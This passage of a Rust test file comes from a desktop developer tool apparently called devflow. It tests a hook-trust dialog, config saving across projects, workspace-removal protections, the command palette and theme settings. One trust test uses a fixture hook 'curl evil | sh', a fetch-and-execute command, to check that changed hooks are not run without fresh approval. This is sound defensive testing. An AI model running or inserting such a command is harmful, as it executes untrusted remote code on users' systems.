            cx,
            move |choice, _, _| recorded.borrow_mut().push(choice),
        );
    })
    .unwrap();
    std::thread::sleep(Duration::from_millis(300));
    frame(cx, &h, |_| {});
    let shown = model_trust(cx).1;
    assert_eq!(runs(&shown.hooks.setup), ["echo one"]);

    // The file changes after the user looked at it; then they click Trust.
    write_hooks("\"echo one\", \"curl evil | sh\"");
    cx.update_window(h.window.into(), |_, window, cx| window.click("trust", cx))
        .unwrap();
    for _ in 0..20 {
        cx.executor().advance_clock(Duration::from_millis(150));
        cx.run_until_parked();
    }
    assert!(
        answers.borrow().is_empty(),
        "nothing ran: {:?}",
        answers.borrow()
    );
    frame(cx, &h, |window| {
        assert!(
            window.find("trust-error").visible(),
            "the dialog says why, and stays open"
        );
    });
    let (state, now) = model_trust(cx);
    assert!(
        matches!(state, trust::TrustState::Untrusted { .. }),
        "nothing was approved: {state:?}"
    );
    assert_eq!(
        runs(&now.hooks.setup),
        ["echo one", "curl evil | sh"],
        "the dialog now holds the new content"
    );

    // Trusting the new content approves exactly that and runs it.
    cx.update_window(h.window.into(), |_, window, cx| window.click("trust", cx))
        .unwrap();
    for _ in 0..20 {
        cx.executor().advance_clock(Duration::from_millis(150));
        cx.run_until_parked();
    }
    assert_eq!(*answers.borrow(), [TrustChoice::Reviewed(Box::new(now))]);
    let project = cx.read_entity(&h.state, |s, _| {
        s.selection.current().unwrap().project.clone().unwrap()
    });
    assert_eq!(trust::state(&project).unwrap(), trust::TrustState::Trusted);
}

fn config_text(cx: &mut TestAppContext, h: &Harness) -> String {
    cx.update(|cx| {
        let project = h.shell.read(cx).project.clone();
        let config = project.read(cx).config.clone();
        config.read(cx).text(cx)
    })
}

#[gpui_kit::test]
fn the_config_editor_follows_the_selected_project_and_save_is_bound_to_its_document(
    cx: &mut TestAppContext,
) {
    let dir = tempfile::tempdir().unwrap();
    let make = |name: &str| -> (Entry, ConfigDocument) {
        let root = dir.path().join(name);
        std::fs::create_dir_all(&root).unwrap();
        let id = Uuid::new_v4();
        std::fs::write(root.join("devflow.toml"), Config::template(name, id, None)).unwrap();
        let entry = Entry {
            id,
            name: name.into(),
            root: root.clone(),
        };
        (entry, ConfigDocument::open(&root).unwrap())
    };
    let (entry_a, doc_a) = make("alpha");
    let (entry_b, doc_b) = make("beta");
    let load = |state: &mut AppState, entry: &Entry, doc: &ConfigDocument| {
        if !state.entries.iter().any(|e| e.id == entry.id) {
            state.entries.push(entry.clone());
        }
        state.selection.select(entry.clone());
        let model = state.selection.current_mut().unwrap();
        model.phase = LoadPhase::Ready;
        model.config = Some(ConfigModel::new(doc.clone(), entry.id, &entry.root));
    };
    let h = open(cx, |s| {
        load(s, &entry_a, &doc_a);
        s.tab = Tab::Config;
    });
    frame(cx, &h, |_| {});
    assert_eq!(config_text(cx, &h), doc_a.content);
    let identity = |cx: &mut TestAppContext| {
        cx.read_entity(&h.state, |s, _| {
            s.selection
                .current()
                .unwrap()
                .config
                .as_ref()
                .unwrap()
                .identity
                .clone()
        })
    };
    let a_identity = identity(cx);

    // Load B: both documents start counting at the same place per project, but
    // the editor must follow the selection, not a per-project counter.
    update(cx, &h, |s, cx| {
        load(s, &entry_b, &doc_b);
        cx.notify();
    });
    frame(cx, &h, |_| {});
    assert_eq!(
        config_text(cx, &h),
        doc_b.content,
        "the editor shows the selected project's file"
    );
    let b_identity = identity(cx);
    assert_ne!(a_identity, b_identity);

    let save = |cx: &mut TestAppContext, text: String, loaded| {
        cx.update_window(h.window.into(), |_, window, cx| {
            h.state
                .update(cx, |s, cx| s.save_config(text, loaded, window, cx))
        })
        .unwrap();
        cx.run_until_parked();
    };
    let read = |entry: &Entry| std::fs::read_to_string(entry.root.join("devflow.toml")).unwrap();

    // Text loaded from A's document is refused while B is selected ...
    save(
        cx,
        format!("{}# written from A's editor\n", doc_a.content),
        a_identity,
    );
    assert_eq!(read(&entry_b), doc_b.content, "B was not overwritten");
    assert_eq!(read(&entry_a), doc_a.content, "A was not written either");

    // ... and B's own text goes to B's file.
    let edited = format!("{}# edited\n", doc_b.content);
    save(cx, edited.clone(), b_identity);
    assert_eq!(read(&entry_b), edited);
    assert_eq!(read(&entry_a), doc_a.content);
    frame(cx, &h, |_| {});
    assert_eq!(config_text(cx, &h), edited, "the saved document is current");
}

fn refreshed(h: &Harness, cx: &mut TestAppContext, daemon_name: &str) -> Refreshed {
    let (project, workspaces) = cx.read_entity(&h.state, |s, _| {
        let model = s.selection.current().unwrap();
        (model.project.clone().unwrap(), model.workspaces.clone())
    });
    Refreshed {
        project,
        workspaces: Ok(workspaces),
        database: DatabaseModel::default(),
        services: crate::services::ServicesModel::default(),
        trust: Ok(TrustState::Trusted),
        pitchfork: Some(pitchfork_model(
            "main",
            "/tmp/shop/main",
            vec![daemon(daemon_name, "running", &[], None, false)],
        )),
        config: None,
        logs: None,
    }
}

#[gpui_kit::test]
fn a_refresh_for_another_workspace_is_dropped(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    let daemons = |cx: &mut TestAppContext| {
        cx.read_entity(&h.state, |s, _| {
            s.selection
                .current()
                .unwrap()
                .pitchfork
                .daemons()
                .iter()
                .map(|d| d.name.clone())
                .collect::<Vec<_>>()
        })
    };
    let apply = |cx: &mut TestAppContext, stamp, daemon: &str| {
        let result: Result<Refreshed, LoadError> = Ok(refreshed(&h, cx, daemon));
        update(cx, &h, |s, cx| {
            // One slot beyond the limit: the follow-up refresh must not start.
            s.inflight = MAX_JOBS + 1;
            s.apply_refresh(stamp, false, result, cx)
        });
    };

    // A refresh for "main" is running when the user picks "feature-x" ...
    let for_main = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    update(cx, &h, |s, cx| s.select_workspace("feature-x".into(), cx));
    // ... and main's daemons arrive afterwards.
    apply(cx, for_main, "main/web");
    assert!(
        daemons(cx).is_empty(),
        "main's daemons must not be shown under feature-x: {:?}",
        daemons(cx)
    );
    assert_eq!(
        cx.read_entity(&h.state, |s, _| s
            .selection
            .current()
            .unwrap()
            .selected_workspace
            .clone()),
        Some("feature-x".to_string())
    );

    // The refresh for the current workspace is applied.
    let for_feature = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    apply(cx, for_feature, "feature-x/web");
    assert_eq!(daemons(cx), ["feature-x/web"]);

    // An older refresh finishing after a newer one started is dropped too.
    let older = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    let newer = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    apply(cx, older, "stale/web");
    assert_eq!(daemons(cx), ["feature-x/web"]);
    apply(cx, newer, "fresh/web");
    assert_eq!(daemons(cx), ["fresh/web"]);
}

#[gpui_kit::test]
fn a_stale_force_remove_offer_cannot_target_another_project(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    // The offer a failed removal of "shop"'s feature-x left behind ...
    let target = cx.read_entity(&h.state, |s, _| {
        s.selection
            .current()
            .unwrap()
            .workspace_ref("feature-x")
            .unwrap()
    });
    // ... is clicked after another project (with a feature-x of its own) was selected.
    update(cx, &h, |s, cx| {
        select_other_project(s);
        cx.notify();
    });
    update(cx, &h, |_, cx| {
        cx.emit(AppEvent::OfferForceRemove {
            target,
            keep_data: false,
            delete_branch: false,
        })
    });
    frame(cx, &h, |window| {
        assert!(
            window.try_find("delete-branch").is_none(),
            "no removal dialog may open for the other project"
        );
    });
}

#[gpui_kit::test]
fn the_log_viewer_follows_a_log_whose_tail_window_keeps_its_length(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    update(cx, &h, |s, cx| s.set_tab(Tab::Logs, cx));
    let show = |cx: &mut TestAppContext, text: String| {
        update(cx, &h, |s, cx| {
            s.selection.current_mut().unwrap().logs.content = Some(Ok(text));
            cx.notify();
        })
    };
    let viewer = |cx: &mut TestAppContext| {
        cx.update(|cx| {
            let logs = h.shell.read(cx).project.read(cx).logs.clone();
            logs.read(cx).text(cx)
        })
    };
    // Same path, same length: only the content moved (the tail of a log that
    // grew past the 512 KiB window looks exactly like this).
    let tail = |last: char| format!("{}{last}", "x".repeat(4096));
    show(cx, tail('a'));
    frame(cx, &h, |_| {});
    assert!(viewer(cx).ends_with('a'));
    show(cx, tail('b'));
    frame(cx, &h, |_| {});
    assert!(
        viewer(cx).ends_with('b'),
        "the viewer stalled on the old tail"
    );
}

#[gpui_kit::test]
fn removing_the_workspace_the_app_was_started_in_is_refused(cx: &mut TestAppContext) {
    use crate::ops::RemoveChoice;
    let scratch = scratch_project();
    let h = open_scratch(cx, &scratch);
    create_workspace(cx, &h, "feature-c");
    let (target, path) = cx.read_entity(&h.state, |s, _| {
        let model = s.selection.current().unwrap();
        (
            model.workspace_ref("feature-c").unwrap(),
            model.workspace("feature-c").unwrap().workspace.path.clone(),
        )
    });
    // Started from inside that workspace (a terminal opened there).
    update(cx, &h, |s, _| s.launch_dir = Some(path.clone()));

    cx.update_window(h.window.into(), |_, window, cx| {
        h.state.update(cx, |s, cx| {
            s.remove_workspace(
                target.clone(),
                RemoveChoice::default(),
                TrustChoice::NotNeeded,
                window,
                cx,
            )
        });
    })
    .unwrap();
    settle(cx, &h, |s| s.busy().is_none());
    cx.read_entity(&h.state, |s, _| {
        let outcome = &s.activity.as_ref().unwrap().outcome;
        assert!(
            matches!(outcome, Some(Err(e)) if e.contains("current directory")),
            "{outcome:?}"
        );
        assert!(
            s.selection
                .current()
                .unwrap()
                .workspace("feature-c")
                .is_some()
        );
    });
    assert!(path.exists(), "nothing was removed");
    // The caller's own workspace is not a protection `force` overrides (core's
    // `Protected { forceable: false }`), so no "Force remove" is offered.
    // The toast slides in on the wall clock.
    std::thread::sleep(std::time::Duration::from_millis(450));
    frame(cx, &h, |window| {
        assert!(
            window.try_find("force-remove").is_none(),
            "forcing cannot override the launch-directory protection"
        );
    });
}

// ---- round-2 review regressions -------------------------------------------

fn git(dir: &std::path::Path, args: &[&str]) {
    let status = std::process::Command::new("git")
        .args(["-c", "user.name=t", "-c", "user.email=t@example.com"])
        .args(args)
        .current_dir(dir)
        .status()
        .unwrap();
    assert!(status.success(), "git {args:?}");
}

#[gpui_kit::test]
fn a_stale_removal_is_refused_by_core_forced_or_not_and_never_offers_force(
    cx: &mut TestAppContext,
) {
    use crate::ops::{RemoveChoice, TrustChoice};
    let scratch = scratch_project();
    let h = open_scratch(cx, &scratch);
    create_workspace(cx, &h, "feature-d");
    let (stale_list, target) = cx.read_entity(&h.state, |s, _| {
        let model = s.selection.current().unwrap();
        (
            model.workspaces.clone(),
            model.workspace_ref("feature-d").unwrap(),
        )
    });
    assert!(target.instance_id.is_some(), "it was set up by devflow");
    let (root, old_path) = (scratch.entry.root.clone(), target.path.clone());

    // Outside the app, A is removed and the branch comes back at path B,
    // where there is work that exists nowhere else.
    git(
        &root,
        &["worktree", "remove", "--force", old_path.to_str().unwrap()],
    );
    let new_path = scratch._outer.path().join("recreated-feature-d");
    git(
        &root,
        &["worktree", "add", new_path.to_str().unwrap(), "feature-d"],
    );
    let precious = new_path.join("precious.txt");
    std::fs::write(&precious, "uncommitted work").unwrap();

    // The app's cached view still shows A, and the user submits their removal.
    let submit = |cx: &mut TestAppContext, force: bool| {
        settle(cx, &h, |s| s.inflight == 0 && s.busy().is_none());
        cx.update_window(h.window.into(), |_, window, cx| {
            window.clear_notifications(cx);
            h.state.update(cx, |s, cx| {
                s.selection.current_mut().unwrap().workspaces = stale_list.clone();
                s.remove_workspace(
                    target.clone(),
                    RemoveChoice {
                        force,
                        ..RemoveChoice::default()
                    },
                    TrustChoice::NotNeeded,
                    window,
                    cx,
                )
            });
        })
        .unwrap();
        assert!(
            cx.read_entity(&h.state, |s, _| s.busy().is_some()),
            "the stale request reached core: the cached view still showed A"
        );
        settle(cx, &h, |s| s.busy().is_none());
        cx.read_entity(&h.state, |s, _| {
            let outcome = &s.activity.as_ref().unwrap().outcome;
            assert!(
                matches!(outcome, Some(Err(_))),
                "force={force}: {outcome:?}"
            );
        });
        assert!(
            precious.exists(),
            "force={force}: the recreated workspace and its file survived"
        );
    };

    submit(cx, false);
    // The refusal is an error, and "Force remove" is not on offer.
    // The toast slides in on the wall clock.
    std::thread::sleep(std::time::Duration::from_millis(450));
    frame(cx, &h, |window| {
        assert!(
            window.try_find("force-remove").is_none(),
            "a stale expectation is not a protection that force overrides"
        );
    });

    // Even a forced removal cannot reach it.
    submit(cx, true);
    assert!(new_path.join("precious.txt").exists());
}

fn two_projects(dir: &std::path::Path) -> [(Entry, ConfigDocument); 2] {
    ["alpha", "beta"].map(|name| {
        let root = dir.join(name);
        std::fs::create_dir_all(&root).unwrap();
        let id = Uuid::new_v4();
        std::fs::write(root.join("devflow.toml"), Config::template(name, id, None)).unwrap();
        let entry = Entry {
            id,
            name: name.into(),
            root: root.clone(),
        };
        (entry, ConfigDocument::open(&root).unwrap())
    })
}

fn load_config_of(state: &mut AppState, entry: &Entry, doc: &ConfigDocument) {
    if !state.entries.iter().any(|e| e.id == entry.id) {
        state.entries.push(entry.clone());
    }
    state.selection.select(entry.clone());
    let model = state.selection.current_mut().unwrap();
    model.phase = LoadPhase::Ready;
    model.config = Some(ConfigModel::new(doc.clone(), entry.id, &entry.root));
}

/// Type `text` into the Config tab's editor.
fn type_config(cx: &mut TestAppContext, h: &Harness, text: &str) {
    let editor = cx.update(|cx| h.shell.read(cx).project.read(cx).config.clone());
    cx.update_window(h.window.into(), |_, window, cx| {
        editor.update(cx, |view, cx| view.set_text(text.into(), window, cx))
    })
    .unwrap();
}

/// Save A's text while its file was changed behind the app's back: the save is
/// refused and the "changed on disk" toast with its Reload button appears.
fn refuse_save_of_changed_file(
    cx: &mut TestAppContext,
    h: &Harness,
    entry: &Entry,
    doc: &ConfigDocument,
) -> String {
    let changed = format!("{}# changed on disk\n", doc.content);
    std::fs::write(entry.root.join("devflow.toml"), &changed).unwrap();
    let loaded = cx.read_entity(&h.state, |s, _| {
        s.selection
            .current()
            .unwrap()
            .config
            .as_ref()
            .unwrap()
            .identity
            .clone()
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        window.clear_notifications(cx);
        h.state.update(cx, |s, cx| {
            s.save_config(format!("{}# mine\n", doc.content), loaded, window, cx)
        })
    })
    .unwrap();
    cx.run_until_parked();
    frame(cx, h, |_| {});
    // The toast slides in on the wall clock.
    std::thread::sleep(std::time::Duration::from_millis(450));
    frame(cx, h, |window| {
        assert!(
            window.find("reload-config").visible(),
            "the toast offers Reload"
        )
    });
    changed
}

fn click_reload_in_toast(cx: &mut TestAppContext, h: &Harness) {
    cx.update_window(h.window.into(), |_, window, cx| {
        window.hover("reload-config", cx);
        window.click("reload-config", cx);
    })
    .unwrap();
    for _ in 0..5 {
        cx.executor()
            .advance_clock(std::time::Duration::from_millis(150));
        cx.run_until_parked();
    }
    frame(cx, h, |_| {});
}

#[gpui_kit::test]
fn a_changed_on_disk_toast_reload_reloads_its_own_project(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let [(entry_a, doc_a), _] = two_projects(dir.path());
    let h = open(cx, |s| {
        load_config_of(s, &entry_a, &doc_a);
        s.tab = Tab::Config;
    });
    frame(cx, &h, |_| {});
    let changed = refuse_save_of_changed_file(cx, &h, &entry_a, &doc_a);
    type_config(cx, &h, "# my unsaved edit\n");

    click_reload_in_toast(cx, &h);
    assert_eq!(
        config_text(cx, &h),
        changed,
        "Reload shows what is on disk for the project it was offered for"
    );
}

#[gpui_kit::test]
fn a_changed_on_disk_toast_cannot_reload_another_project_over_its_unsaved_edits(
    cx: &mut TestAppContext,
) {
    let dir = tempfile::tempdir().unwrap();
    let [(entry_a, doc_a), (entry_b, doc_b)] = two_projects(dir.path());
    let h = open(cx, |s| {
        load_config_of(s, &entry_a, &doc_a);
        s.tab = Tab::Config;
    });
    frame(cx, &h, |_| {});
    // A's file changed under the editor: the toast offers A's Reload.
    refuse_save_of_changed_file(cx, &h, &entry_a, &doc_a);

    // The user moves on to B and starts editing it.
    update(cx, &h, |s, cx| {
        load_config_of(s, &entry_b, &doc_b);
        cx.notify();
    });
    frame(cx, &h, |_| {});
    let identity = |cx: &mut TestAppContext| {
        cx.read_entity(&h.state, |s, _| {
            s.selection
                .current()
                .unwrap()
                .config
                .as_ref()
                .unwrap()
                .identity
                .clone()
        })
    };
    let b_identity = identity(cx);
    let edit = format!("{}# unsaved edit of B\n", doc_b.content);
    type_config(cx, &h, &edit);
    frame(cx, &h, |_| {});

    // A's toast is still on screen; its Reload must not touch B.
    frame(cx, &h, |window| {
        assert!(
            window.find("reload-config").visible(),
            "A's toast is still shown"
        )
    });
    click_reload_in_toast(cx, &h);
    assert_eq!(identity(cx), b_identity, "B's document was not reloaded");
    assert_eq!(config_text(cx, &h), edit, "B's unsaved edit survived");
    assert_eq!(
        std::fs::read_to_string(entry_b.root.join("devflow.toml")).unwrap(),
        doc_b.content,
        "B's file was not written"
    );
}

// ---- title bar, shortcuts, palette, theme and the sidebar tree -----------------

/// Press a key with whatever focus there is, and let what it started finish.
pub(super) fn press_key(cx: &mut TestAppContext, h: &Harness, key: &str) {
    cx.update_window(h.window.into(), |_, window, cx| window.press(key, cx))
        .unwrap();
    cx.run_until_parked();
}

fn page_and_tab(cx: &mut TestAppContext, h: &Harness) -> (Page, Tab) {
    cx.read_entity(&h.state, |s, _| (s.page, s.tab))
}

fn is_dark(cx: &mut TestAppContext) -> bool {
    cx.update(|cx| cx.theme().is_dark())
}

fn dialog_is_open(cx: &mut TestAppContext, h: &Harness) -> bool {
    cx.update_window(h.window.into(), |_, window, cx| {
        window.render_frame(cx);
        window.try_find("dialog").is_some()
    })
    .unwrap()
}

#[gpui_kit::test]
fn the_title_bar_has_search_refresh_and_the_theme_switch(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |window| {
        for id in ["palette", "refresh", "theme-toggle"] {
            let button = window.find(id);
            assert!(button.visible(), "{id} is laid out");
            assert!(
                button.bounds().bottom() <= TITLE_BAR_HEIGHT,
                "{id} is in the title bar"
            );
        }
        // The page starts under the bar.
        assert!(window.find("new-workspace").bounds().top() >= TITLE_BAR_HEIGHT);
    });
    // The search button is the palette's other way in.
    cx.update_window(h.window.into(), |_, window, cx| window.click("palette", cx))
        .unwrap();
    cx.run_until_parked();
    frame(cx, &h, |window| {
        assert!(window.find("command").visible(), "the palette opened")
    });
}

#[gpui_kit::test]
fn shortcuts_work_with_nothing_focused(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| {
        assert!(!window.has_focused_input(cx), "nothing has the cursor");
    })
    .unwrap();

    for (key, tab) in [
        ("secondary-2", Tab::Data),
        ("secondary-3", Tab::Daemons),
        ("secondary-4", Tab::Setup),
        ("secondary-5", Tab::Config),
        ("secondary-6", Tab::Logs),
        ("secondary-1", Tab::Workspaces),
    ] {
        press_key(cx, &h, key);
        assert_eq!(page_and_tab(cx, &h), (Page::Project, tab), "{key}");
    }
    press_key(cx, &h, "secondary-,");
    assert_eq!(page_and_tab(cx, &h).0, Page::Settings);
    // A tab shortcut leaves the settings page too.
    press_key(cx, &h, "secondary-3");
    assert_eq!(page_and_tab(cx, &h), (Page::Project, Tab::Daemons));
}

#[gpui_kit::test]
fn the_refresh_shortcut_refreshes_the_selected_project(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    update(cx, &h, |s, _| s.inflight = 0);
    // No `run_until_parked`: the job is still running (and would find no
    // project at the fake path).
    cx.update_window(h.window.into(), |_, window, cx| {
        window.press("secondary-r", cx)
    })
    .unwrap();
    assert!(
        cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().refreshing),
        "a refresh started"
    );
}

#[gpui_kit::test]
fn the_new_workspace_shortcut_opens_the_dialog_and_dialogs_are_modal(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    update(cx, &h, |s, _| s.tab = Tab::Data);
    frame(cx, &h, |_| {});
    press_key(cx, &h, "secondary-n");
    assert!(dialog_is_open(cx, &h), "the dialog opened");
    assert_eq!(
        page_and_tab(cx, &h),
        (Page::Project, Tab::Workspaces),
        "the output of the new workspace is shown there"
    );

    // Behind a dialog the page does not move ...
    press_key(cx, &h, "secondary-2");
    press_key(cx, &h, "secondary-,");
    assert_eq!(page_and_tab(cx, &h), (Page::Project, Tab::Workspaces));
    // ... and a second dialog does not pile up.
    press_key(cx, &h, "secondary-n");
    press_key(cx, &h, "secondary-k");
    frame(cx, &h, |window| {
        assert!(window.try_find("command").is_none(), "no palette on top");
        window.find("dialog");
    });

    press_key(cx, &h, "escape");
    assert!(!dialog_is_open(cx, &h));
    press_key(cx, &h, "secondary-2");
    assert_eq!(page_and_tab(cx, &h).1, Tab::Data);
}

/// Open the palette with its shortcut.
fn open_palette(cx: &mut TestAppContext, h: &Harness) {
    press_key(cx, h, "secondary-k");
    frame(cx, h, |window| {
        assert!(window.find("command").visible(), "the palette is open");
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        assert!(
            window.has_focused_input(cx),
            "the search field has the cursor"
        );
    })
    .unwrap();
}

/// Open the palette, search for `query`, and choose the first match.
fn choose(cx: &mut TestAppContext, h: &Harness, query: &str) {
    open_palette(cx, h);
    cx.update_window(h.window.into(), |_, window, cx| window.input(query, cx))
        .unwrap();
    cx.run_until_parked();
    cx.update_window(h.window.into(), |_, window, cx| window.press("enter", cx))
        .unwrap();
    cx.run_until_parked();
    frame(cx, h, |window| {
        assert!(window.try_find("command").is_none(), "choosing closes it");
    });
}

fn blog_entry() -> Entry {
    Entry {
        id: Uuid::new_v4(),
        name: "blog".into(),
        root: PathBuf::from("/tmp/blog"),
    }
}

#[gpui_kit::test]
fn the_palette_filters_and_applies_what_is_chosen(cx: &mut TestAppContext) {
    let blog = blog_entry();
    let h = open(cx, {
        let blog = blog.clone();
        move |state| {
            install_loaded(state);
            state.entries.push(blog);
        }
    });
    frame(cx, &h, |_| {});

    choose(cx, &h, "data");
    assert_eq!(page_and_tab(cx, &h), (Page::Project, Tab::Data));
    choose(cx, &h, "settings");
    assert_eq!(page_and_tab(cx, &h).0, Page::Settings);
    choose(cx, &h, "daemons");
    assert_eq!(page_and_tab(cx, &h), (Page::Project, Tab::Daemons));

    let dark = is_dark(cx);
    choose(cx, &h, "toggle theme");
    assert_ne!(is_dark(cx), dark, "the theme was switched");

    choose(cx, &h, "blog");
    assert_eq!(
        cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().key.project),
        blog.id
    );
    assert!(
        cx.read_entity(&h.state, |s, _| s.is_expanded(blog.id)),
        "the chosen project is unfolded in the sidebar"
    );
}

#[gpui_kit::test]
fn the_palette_opens_a_daemons_url_shows_how_to_install_pitchfork_and_runs_the_doctor(
    cx: &mut TestAppContext,
) {
    let h = open(cx, install_loaded);
    update(cx, &h, |s, _| {
        s.doctor = jobs::DoctorSource::Fixed(vec![devflow_core::doctor::Check {
            name: "git".into(),
            status: devflow_core::doctor::CheckStatus::Ok,
            detail: "git 2.50".into(),
            hint: None,
        }]);
    });
    frame(cx, &h, |_| {});

    // A daemon's URL opens in the browser.
    choose(cx, &h, "open web");
    assert_eq!(
        cx.opened_url().as_deref(),
        Some("https://web.main.localhost")
    );

    // The doctor's checks open in a dialog.
    open_palette(cx, &h);
    cx.update_window(h.window.into(), |_, window, cx| {
        window.input("run doctor", cx)
    })
    .unwrap();
    cx.run_until_parked();
    cx.update_window(h.window.into(), |_, window, cx| window.press("enter", cx))
        .unwrap();
    super::setup_tests::wait(cx, "the doctor's checks", |cx| {
        super::setup_tests::exists(cx, &h, "doctor-checks")
    });
    cx.update_window(h.window.into(), |_, window, cx| window.press("escape", cx))
        .unwrap();

    // Pitchfork missing: the entry leads to the Daemons tab, where the
    // command is shown before anything is run.
    update(cx, &h, |s, cx| {
        let model = s.selection.current_mut().unwrap();
        model.pitchfork.status = None;
        model.pitchfork.detection = Some(Detection {
            path: None,
            installed: false,
            version: None,
            missing_features: Vec::new(),
            problem: None,
        });
        cx.notify();
    });
    choose(cx, &h, "install pitchfork");
    assert_eq!(page_and_tab(cx, &h), (Page::Project, Tab::Daemons));
}

#[gpui_kit::test]
fn the_palette_starts_a_new_workspace_and_closes_with_escape_or_its_shortcut(
    cx: &mut TestAppContext,
) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    choose(cx, &h, "new work");
    // The palette is gone and exactly one dialog (the new workspace form) is up.
    frame(cx, &h, |window| {
        assert!(window.find("dialog").visible());
        assert!(window.find("create").visible(), "the New workspace form");
    });
    press_key(cx, &h, "escape");

    open_palette(cx, &h);
    press_key(cx, &h, "escape");
    assert!(!dialog_is_open(cx, &h), "escape closes the palette");

    open_palette(cx, &h);
    press_key(cx, &h, "secondary-k");
    assert!(
        !dialog_is_open(cx, &h),
        "the shortcut that opened it closes it"
    );
}

#[gpui_kit::test]
fn the_theme_switch_flips_at_once_saves_and_keeps_the_accent(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    let file = cx.read_entity(&h.state, |s, _| s.settings_file().unwrap().to_path_buf());
    assert!(!is_dark(cx));

    cx.update_window(h.window.into(), |_, window, cx| {
        window.click("theme-toggle", cx)
    })
    .unwrap();
    cx.run_until_parked();
    assert!(is_dark(cx), "dark at once, with the setting on System");
    assert_eq!(
        cx.read_entity(&h.state, |s, _| s.settings.theme),
        ThemeChoice::Dark
    );
    let saved = std::fs::read_to_string(&file).unwrap();
    assert!(saved.contains("theme = \"dark\""), "saved: {saved}");
    // `Theme::change` loaded the library's colors; the accent is back on top.
    let accent = crate::theme::accent(ThemeMode::Dark);
    assert_eq!(cx.update(|cx| cx.theme().primary), accent.primary);

    // The shortcut flips it back, from anywhere.
    press_key(cx, &h, "secondary-shift-l");
    assert!(!is_dark(cx));
    assert!(
        std::fs::read_to_string(&file)
            .unwrap()
            .contains("theme = \"light\"")
    );
    let accent = crate::theme::accent(ThemeMode::Light);
    assert_eq!(cx.update(|cx| cx.theme().primary), accent.primary);

    // Other settings are not touched by the switch.
    assert_eq!(
        cx.read_entity(&h.state, |s, _| s.settings.editor_command.clone()),
        Settings::default().editor_command
    );
    let _ = std::fs::remove_file(file);
}

#[gpui_kit::test]
fn the_settings_page_follows_the_switch_and_a_choice_there_is_saved(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    update(cx, &h, |s, _| s.page = Page::Settings);
    frame(cx, &h, |_| {});
    let shown = |cx: &mut TestAppContext| {
        cx.read_entity(&h.shell, |shell, cx| {
            shell
                .settings
                .read(cx)
                .theme
                .read(cx)
                .selected_index(cx)
                .map(|ix| ThemeChoice::ALL[ix.row])
        })
    };
    assert_eq!(shown(cx), Some(ThemeChoice::System));

    press_key(cx, &h, "secondary-shift-l");
    assert_eq!(
        shown(cx),
        Some(ThemeChoice::Dark),
        "the page follows the switch"
    );

    // Choosing there applies and saves at once, without pressing Save.
    cx.update_window(h.window.into(), |_, window, cx| {
        h.state
            .update(cx, |s, cx| s.set_theme(ThemeChoice::Light, window, cx))
    })
    .unwrap();
    cx.run_until_parked();
    assert!(!is_dark(cx));
    assert_eq!(shown(cx), Some(ThemeChoice::Light));
}

#[gpui_kit::test]
fn the_theme_is_in_effect_at_once_and_written_off_the_ui_thread(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    let file = cx.read_entity(&h.state, |s, _| s.settings_file().unwrap().to_path_buf());
    let set = |cx: &mut TestAppContext, choice| {
        cx.update_window(h.window.into(), |_, window, cx| {
            h.state.update(cx, |s, cx| s.set_theme(choice, window, cx))
        })
        .unwrap();
    };

    set(cx, ThemeChoice::Dark);
    // Applied before anything was written: no file, not even its directory.
    assert!(is_dark(cx));
    assert_eq!(
        cx.read_entity(&h.state, |s, _| s.settings.theme),
        ThemeChoice::Dark
    );
    assert!(
        !file.parent().unwrap().exists(),
        "the UI thread wrote nothing"
    );
    cx.run_until_parked();
    assert!(
        std::fs::read_to_string(&file)
            .unwrap()
            .contains("theme = \"dark\"")
    );
    let toasts = cx
        .update_window(h.window.into(), |_, window, cx| {
            window.notifications(cx).len()
        })
        .unwrap();
    assert_eq!(toasts, 0, "a saved theme is not announced");

    // Quick changes: the last one is what ends up on disk.
    for choice in [
        ThemeChoice::Light,
        ThemeChoice::Dark,
        ThemeChoice::System,
        ThemeChoice::Light,
    ] {
        set(cx, choice);
    }
    cx.run_until_parked();
    let saved = std::fs::read_to_string(&file).unwrap();
    assert!(saved.contains("theme = \"light\""), "saved: {saved}");
    assert_eq!(
        cx.read_entity(&h.state, |s, _| s.settings.theme),
        ThemeChoice::Light
    );

    // And a change after the writer went idle is written too.
    set(cx, ThemeChoice::Dark);
    cx.run_until_parked();
    assert!(
        std::fs::read_to_string(&file)
            .unwrap()
            .contains("theme = \"dark\"")
    );
    let _ = std::fs::remove_dir_all(file.parent().unwrap());
}

#[gpui_kit::test]
fn a_theme_that_cannot_be_saved_stays_in_effect_and_is_reported(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    // The directory of the settings file is a regular file.
    let blocker = dir.path().join("not-a-directory");
    std::fs::write(&blocker, "x").unwrap();
    let h = open(cx, install_loaded);
    update(cx, &h, |s, _| s.set_settings_file(blocker.join("gui.toml")));
    frame(cx, &h, |_| {});

    cx.update_window(h.window.into(), |_, window, cx| {
        h.state
            .update(cx, |s, cx| s.set_theme(ThemeChoice::Dark, window, cx))
    })
    .unwrap();
    cx.run_until_parked();
    assert!(is_dark(cx), "still in effect for this session");
    assert_eq!(
        cx.read_entity(&h.state, |s, _| s.settings.theme),
